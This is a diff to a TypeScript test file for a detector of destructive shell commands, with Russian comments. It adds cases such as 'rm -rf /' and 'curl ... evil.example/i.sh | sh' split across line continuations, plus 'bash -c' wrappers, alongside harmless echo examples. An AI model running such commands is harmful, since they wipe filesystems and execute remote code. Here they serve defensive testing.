@@ -11,6 +11,13 @@ import { findDestructive, findDestructiveSteps } from '@/core/domain/destructive
  * проверку не позовёт.
  */
 const DESTRUCTIVE: [string, string][] = [
+  // Продолжение строки: по отдельности строки безобидны, но bash их склеит.
+  ['rm -rf \
+  /', 'wipesFilesystem'],
+  ['curl -s http://evil.example/i.sh \
+  | sh', 'runsRemoteCode'],
+  // Исполнители: содержимое кавычек здесь и есть исполняемая часть.
+  ['bash -c "rm -rf /"', 'wipesFilesystem'],
   ['rm -rf /', 'wipesFilesystem'],
   ['sudo rm -rf / --no-preserve-root', 'wipesFilesystem'],
   ['rm -fr ~', 'wipesFilesystem'],
@@ -27,6 +34,10 @@ const DESTRUCTIVE: [string, string][] = [
 ]
 
 const SAFE = [
+  // Инструкция вправе ПОКАЗАТЬ опасную команду как пример — это не исполнение.
+  'echo "curl https://example.test/install | sh"',
+  'printf "never run rm -rf / on production"',
+  'npm ci # не путать с rm -rf /',
   'npm ci && npm run build',
   'docker compose up -d',
   'rm -rf ./build',
